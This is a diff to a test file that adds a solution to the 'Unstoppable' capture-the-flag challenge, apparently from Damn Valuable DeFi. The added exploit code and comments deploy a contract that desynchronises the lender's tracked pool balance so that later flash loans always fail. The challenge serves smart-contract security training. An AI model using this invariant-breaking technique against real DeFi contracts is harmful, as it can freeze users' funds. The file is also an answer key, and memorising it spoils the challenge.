@@ -4,6 +4,7 @@ const { accounts, contract } = require('@openzeppelin/test-environment');
 const DamnValuableToken = contract.fromArtifact('DamnValuableToken');
 const UnstoppableLender = contract.fromArtifact('UnstoppableLender');
 const ReceiverContract = contract.fromArtifact('ReceiverUnstoppable');
+const HackContract = contract.fromArtifact('HackUnstoppable');
 
 const { expect } = require('chai');
 
@@ -39,7 +40,15 @@ describe('[Challenge] Unstoppable', function () {
     });
 
     it('Exploit', async function () {
-        /** YOUR EXPLOIT GOES HERE */
+        // this exploit uses the flash loan mechanism of the contract to bypass
+        // `depositTokens` method and increase the token balance of the lender
+        // contract hence leaving `poolBalance` out of sync
+        // lender contract will throw on the next `flashLoan` call since
+        // the`assert(poolBalance == balanceBefore)` line will throw
+        this.hack = await HackContract.new(this.pool.address, this.token.address, { from: attacker });
+        await this.token.approve(this.hack.address, 1, { from: attacker });
+        await this.hack.depositTokens({from: attacker});
+        await this.hack.executeFlashLoan(10, { from: attacker });
     });
 
     after(async function () {
